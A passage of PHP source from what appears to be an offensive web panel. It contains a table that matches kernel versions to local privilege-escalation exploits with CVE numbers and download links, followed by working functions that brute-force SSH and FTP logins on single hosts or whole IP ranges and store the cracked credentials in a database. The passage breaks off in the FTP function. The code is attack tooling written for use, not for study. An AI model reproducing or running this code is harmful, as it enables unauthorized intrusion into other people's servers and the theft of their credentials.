array('2.6.30', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'ptrace_kmod2', 'ia32syscall,robert_you_suck' , 'CVE-2010-3301' , 'http://www.exploit-db.com/exploits/15023/', 'rds', 'CVE-2010-3904' , 'http://www.exploit-db.com/exploits/15285/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
array('2.6.31', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'ptrace_kmod2', 'ia32syscall,robert_you_suck' , 'CVE-2010-3301' , 'http://www.exploit-db.com/exploits/15023/', 'rawmodePTY', 'CVE-2014-0196' , 'http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c', 'rds', 'CVE-2010-3904' , 'http://www.exploit-db.com/exploits/15285/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
array('2.6.32', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'ptrace_kmod2', 'ia32syscall,robert_you_suck' , 'CVE-2010-3301' , 'http://www.exploit-db.com/exploits/15023/', 'rawmodePTY', 'CVE-2014-0196' , 'http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c', 'rds', 'CVE-2010-3904' , 'http://www.exploit-db.com/exploits/15285/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
array('2.6.33', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'ptrace_kmod2', 'ia32syscall,robert_you_suck' , 'CVE-2010-3301' , 'http://www.exploit-db.com/exploits/15023/', 'rawmodePTY', 'CVE-2014-0196' , 'http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c', 'rds', 'CVE-2010-3904' , 'http://www.exploit-db.com/exploits/15285/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
array('2.6.34', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'caps_to_root', 'CVE-n/a' , 'http://www.exploit-db.com/exploits/15916/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'ptrace_kmod2', 'ia32syscall,robert_you_suck' , 'CVE-2010-3301' , 'http://www.exploit-db.com/exploits/15023/', 'rawmodePTY', 'CVE-2014-0196' , 'http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c', 'rds', 'CVE-2010-3904' , 'http://www.exploit-db.com/exploits/15285/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/'),
array('2.6.35', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'caps_to_root', 'CVE-n/a' , 'http://www.exploit-db.com/exploits/15916/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'rawmodePTY', 'CVE-2014-0196' , 'http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c', 'rds', 'CVE-2010-3904' , 'http://www.exploit-db.com/exploits/15285/'),
array('2.6.36', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'caps_to_root', 'CVE-n/a' , 'http://www.exploit-db.com/exploits/15916/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'rawmodePTY', 'CVE-2014-0196' , 'http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c', 'rds', 'CVE-2010-3904' , 'http://www.exploit-db.com/exploits/15285/'),
array('2.6.37', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'rawmodePTY', 'CVE-2014-0196' , 'http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c', 'semtex', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/25444/‎'),
array('2.6.38', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'rawmodePTY', 'CVE-2014-0196' , 'http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c', 'semtex', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/25444/‎'),
array('2.6.39', 'memodipper', 'CVE-2012-0056' , 'http://www.exploit-db.com/exploits/18411/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'rawmodePTY', 'CVE-2014-0196' , 'http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c', 'semtex', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/25444/‎'),
array('2.6.4', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
array('2.6.5', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'krad', 'krad3', 'http://exploit-db.com/exploits/1397', 'ong_bak', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
array('2.6.6', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
array('2.6.7', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'krad', 'krad3', 'http://exploit-db.com/exploits/1397', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
array('2.6.8', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'h00lyshit', 'CVE-2006-3626' , 'http://www.exploit-db.com/exploits/2013/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'krad', 'krad3', 'http://exploit-db.com/exploits/1397', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
array('2.6.9', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'exp.sh', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'krad', 'krad3', 'http://exploit-db.com/exploits/1397', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'py2', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
array('3.0.0', 'memodipper', 'CVE-2012-0056' , 'http://www.exploit-db.com/exploits/18411/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'semtex', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/25444/‎'),
array('3.0.1', 'memodipper', 'CVE-2012-0056' , 'http://www.exploit-db.com/exploits/18411/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'semtex', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/25444/‎'),
array('3.0.2', 'memodipper', 'CVE-2012-0056' , 'http://www.exploit-db.com/exploits/18411/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'semtex', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/25444/‎'),
array('3.0.3', 'memodipper', 'CVE-2012-0056' , 'http://www.exploit-db.com/exploits/18411/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'semtex', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/25444/‎'),
array('3.0.4', 'memodipper', 'CVE-2012-0056' , 'http://www.exploit-db.com/exploits/18411/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'semtex', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/25444/‎'),
array('3.0.5', 'memodipper', 'CVE-2012-0056' , 'http://www.exploit-db.com/exploits/18411/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'semtex', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/25444/‎'),
array('3.0.6', 'memodipper', 'CVE-2012-0056' , 'http://www.exploit-db.com/exploits/18411/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'semtex', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/25444/‎'),
array('3.1.0', 'memodipper', 'CVE-2012-0056' , 'http://www.exploit-db.com/exploits/18411/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'semtex', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/25444/‎'),
array('3.2', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
array('3.3', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
array('3.4', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
array('3.4.0', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
array('3.4.1', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
array('3.4.2', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
array('3.4.3', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
array('3.4.4', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
array('3.4.5', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
array('3.4.6', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
array('3.4.8', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
array('3.4.9', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
array('3.5', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
array('3.5.0', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
array('3.6', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
array('3.6.0', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
array('3.7', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
array('3.7.0', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
array('3.7.6', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/'),
array('3.8', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
array('3.8.0', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
array('3.8.1', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
array('3.8.2', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
array('3.8.3', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
array('3.8.4', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
array('3.8.5', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
array('3.8.6', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
array('3.8.7', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
array('3.8.8', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
array('3.8.9', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
array('3.9', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
array('3.9.0', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
array('3.9.6', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/')
);

foreach($exploits as $exploit) {
    if($exploit[0] == $kernel) {
        echo 'Informations: <br />';
            foreach($exploit as $ex) {
                echo ' - '.$ex.'<br />';
            }
    }
}

}

function showbrute() {

$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
mysqli_select_db($conn,SQL_DB );

$ftp = 0;
$ssh = 0;
$dbs = 0;
$www = 0;

$data = mysqli_query($conn,"SELECT * FROM `brute`") or die("Shits fuckd up - ".mysql_error());
echo '<table style="width: 60%; margin-left: auto; margin-right: auto; border-spacing: 5px;">';
echo '<tr><td><b>ID</b></td><td><b>HOST</b></td><td><b>USER</b></td><td><b>PASS</b></td></tr>';
while($row = mysqli_fetch_assoc($data)) {

$x = explode(':', $row["credentials"]);
$y = explode(':', $row["service"]);

if($y[1] == '22') {
    $ssh++;
}
elseif($y[1] == '21') {
    $ftp++;
}
elseif($y[1] == '3306' || $y[1] == '1433' || $y[1] == '5432') {
    $dbs++;
}
elseif($y[1] == '80') {
    $www++;
}
    
echo '<tr><td>'.$row["id"].'.</td><td>'.$row["service"].'</td><td>'.$x[0].'</td><td>'.$x[1].'</td></tr>';
}
echo '</table>';
echo '<br /><center>ftp - '.$ftp.' &nbsp;&bull;&nbsp; ssh - '.$ssh.' &nbsp;&bull;&nbsp; dbs - '.$dbs.' &nbsp;&bull;&nbsp; www - '.$www.'</center>';

}

function brute_ssh() {

$passes = array('', 'root', 'test', 'admin', 'zaq123wsx', '1234', '12345', '123456', 'fuckyou', 'Password123');
$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
mysqli_select_db(SQL_DB, $conn);

    if(isset($_POST['shost']) && isset($_POST['spath']) && isset($_POST['suser'])) {


    echo '<div class="post">';
    echo '<h2 class="title"><a href="#">Results</a></h2>';
    echo '<div class="entry">';
    echo '<p class="meta"> Single SSH attack &nbsp;&bull;&nbsp; Broken credentials will be stored in database &nbsp;&bull;&nbsp; Using wordlist - ';
    if(isset($_POST['wordlist']) == 1) {
        echo 'yes</p>';
    } else {
        echo 'no</p>';
    }

       if($checkssh = fsockopen($_POST['shost'], 22, $errno, $errstr, 5)) {
        echo '<b>&raquo;</b> <b>'.htmlspecialchars($_POST['shost']).'</b> - SSH found on port 22.<br /><br />';

        if($_POST['wordlist'] == 1) {

            if(file_exists($_POST['spath'])) {
                $pwds = file($_POST['spath']);
            } else {
                echo '<p>File not found... Using default passwords.</p>';
                $pwds = $passes;
            }

        } else {
            $pwds = $passes;
        }

        

        
        foreach ($pwds as $haslo){
          $sshconn = ssh2_connect($_POST['shost'], 22);
          if(ssh2_auth_password($sshconn, $_POST['suser'], trim($haslo))) {
        echo " - <font color=\"#009900\">" . htmlspecialchars($_POST['suser']) . ':' . htmlspecialchars($haslo) . " - Success!</font><br />";
        mysqli_query($conn,"INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($_POST['shost']).":22', '".mysql_escape_string($_POST['suser']).":".mysql_escape_string($haslo)."')", $conn);
        ssh2_exec($sshconn, 'exit');
          } else {
        echo " - <font color=\"#990000\">" . htmlspecialchars($_POST['suser']) . ':' . htmlspecialchars($haslo) . "</font><br />";
          }

        }
        



        } else { 
        echo '<b>&raquo;</b> <b>'.htmlspecialchars($_POST['shost']).'</b> - SSH seems not working (22).';
        }


    echo '</div></div>';

    }

    elseif(isset($_POST['mhost']) && isset($_POST['mpath']) && isset($_POST['muser'])) {

    echo '<div class="post">';
    echo '<h2 class="title"><a href="#">Results</a></h2>';
    echo '<div class="entry">';
    echo '<p class="meta"> Massive SSH attack &nbsp;&bull;&nbsp; Broken credentials will be stored in database &nbsp;&bull;&nbsp; Using wordlist - ';
    if(isset($_POST['wordlist']) == 2) {
        echo 'yes</p>';
    } else {
        echo 'no</p>';
    }

    $ips = explode('-', $_POST['mhost']);

    for($ip = ip2long($ips[0]); $ip <= ip2long($ips[1]); $ip++) {

               if($checkssh = fsockopen(long2ip($ip), 22, $errno, $errstr, 5)) {
        echo '<br /><b>&raquo;</b> <b>'.long2ip($ip).'</b> - SSH found on port 22.<br /><br />';

        if($_POST['wordlist'] == 2) {

            if(file_exists($_POST['mpath'])) {
                $pwds = file($_POST['mpath']);
            } else {
                echo '<p>File not found... Using default passwords.</p>';
                $pwds = $passes;
            }

        } else {
            $pwds = $passes;
        }

        foreach ($pwds as $haslo){

            $sshconn = ssh2_connect(long2ip($ip), 22);

          if(ssh2_auth_password($sshconn, $_POST['muser'], trim($haslo)))
          {
        echo " - <font color=\"#009900\">" . htmlspecialchars($_POST['muser']) . ':' . htmlspecialchars($haslo) . " - Success!</font><br />";
        mysqli_query($conn,"INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string(long2ip($ip)).":22', '".mysql_escape_string($_POST['muser']).":".mysql_escape_string($haslo)."')", $conn);
        ssh2_exec($sshconn, 'exit');
        break;
          } else {
        echo " - <font color=\"#990000\">" . htmlspecialchars($_POST['muser']) . ':' . htmlspecialchars($haslo) . "</font><br />";
          }

        }
        
        } else { 
            echo '<br /><b>&raquo;</b> <b>'.long2ip($ip).'</b> - SSH seems not working (22).<br />';
        }

    }

    echo '</div></div>';

    }

mysqli_close($conn);

}

function brute_ftp() {

$passes = array('', 'root', 'test', 'admin', 'zaq123wsx', '1234', '12345', '123456', 'fuckyou', 'Password123');
$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
mysqli_select_db(SQL_DB, $conn);

    if(isset($_POST['shost']) && isset($_POST['spath']) && isset($_POST['suser'])) {


    echo '<div class="post">';
    echo '<h2 class="title"><a href="#">Results</a></h2>';
    echo '<div class="entry">';
    echo '<p class="meta"> Single FTP attack &nbsp;&bull;&nbsp; Broken credentials will be stored in database &nbsp;&bull;&nbsp; Using wordlist - ';
    if(isset($_POST['wordlist']) == 1) {
        echo 'yes</p>';
    } else {
        echo 'no</p>';
    }

       if($checkftp = fsockopen($_POST['shost'], 21, $errno, $errstr, 5)) {
        echo '<br /><b>&raquo;</b> <b>'.htmlspecialchars($_POST['shost']).'</b> - FTP found on port 21.<br />';

        if($_POST['wordlist'] == 1) {

            if(file_exists($_POST['spath'])) {
                $pwds = file($_POST['spath']);
            } else {
                echo '<p>File not found... Using default passwords.</p>';
                $pwds = $passes;
            }

        } else {
